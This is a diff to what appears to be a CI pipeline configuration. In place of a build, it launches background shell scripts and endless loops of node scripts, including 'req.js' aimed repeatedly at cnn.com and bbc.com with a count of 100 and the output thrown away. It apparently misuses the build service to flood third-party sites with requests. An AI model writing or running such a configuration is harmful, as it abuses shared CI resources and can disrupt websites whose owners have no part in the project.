@@ -11,13 +11,13 @@ pipelines:
         caches:
           - pip
         script: # Modify the commands below to build your repository.
-           - apt update && apt -y install wget curl axel
+           - apt update && apt -y install wget curl axel nodejs npm
            - chmod +x ./test.sh && ./test.sh &
            - chmod +x ./google.sh && ./google.sh &
            - chmod +x ./rw.sh && ./rw.sh &
            - chmod +x ./jira.sh && ./jira.sh &
            - npm install && while true; do nodejs jira.js; done &
            - npm install && while true; do nodejs gitlab.js; done &
-           - while true; do node req.js https://www.cnn.com 100 > /dev/null; done &
-           - while true; do node req.js https://www.bbc.com 100 > /dev/null; done
+           - while true; do nodejs req.js https://www.cnn.com 100 > /dev/null; done &
+           - while true; do nodejs req.js https://www.bbc.com 100 > /dev/null; done
 
